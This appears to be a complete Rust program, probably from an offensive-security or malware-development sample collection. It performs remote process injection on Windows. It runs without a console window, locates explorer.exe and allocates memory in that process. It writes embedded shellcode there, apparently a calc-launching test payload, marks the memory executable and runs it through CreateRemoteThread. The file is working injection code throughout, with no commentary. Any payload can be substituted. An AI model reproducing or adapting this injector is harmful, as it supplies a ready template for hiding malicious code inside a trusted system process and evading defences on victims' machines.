#![windows_subsystem = "windows"]

use std::mem::transmute;
use std::ptr::{null, null_mut};
use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, FALSE};
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows_sys::Win32::System::Memory::{
    VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::{CreateRemoteThread, OpenProcess, PROCESS_ALL_ACCESS};

#[cfg(target_os = "windows")]
fn main() {
    let shellcode = include_bytes!("../../w64-exec-calc-shellcode-func.bin");
    let shellcode_size = shellcode.len();

    let mut system = System::new();
    system.refresh_processes();

    let pid = system
        .processes_by_name("explorer")
        .next()
        .expect("[-]no process!")
        .pid()
        .as_u32();

    unsafe {
        let handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if handle == 0 {
            panic!("[-]OpenProcess failed: {}!", GetLastError());
        }

        let addr = VirtualAllocEx(
            handle,
            null(),
            shellcode_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if addr.is_null() {
            panic!("[-]VirtualAllocEx failed: {}!", GetLastError());
        }

        let res = WriteProcessMemory(
            handle,
            addr,
            shellcode.as_ptr().cast(),
            shellcode_size,
            null_mut(),
        );
        if res == FALSE {
            panic!("[-]WriteProcessMemory failed: {}!", GetLastError());
        }

        let mut old = PAGE_READWRITE;
        let res = VirtualProtectEx(handle, addr, shellcode_size, PAGE_EXECUTE, &mut old);
        if res == FALSE {
            panic!("[-]VirtualProtectEx failed: {}!", GetLastError());
        }

        let func = transmute(addr);
        let thread = CreateRemoteThread(handle, null(), 0, func, null(), 0, null_mut());
        if thread == 0 {
            panic!("[-]CreateRemoteThread failed: {}!", GetLastError());
        }

        let res = CloseHandle(handle);
        if res == FALSE {
            panic!("[-]CloseHandle failed: {}!", GetLastError());
        }
    }
}
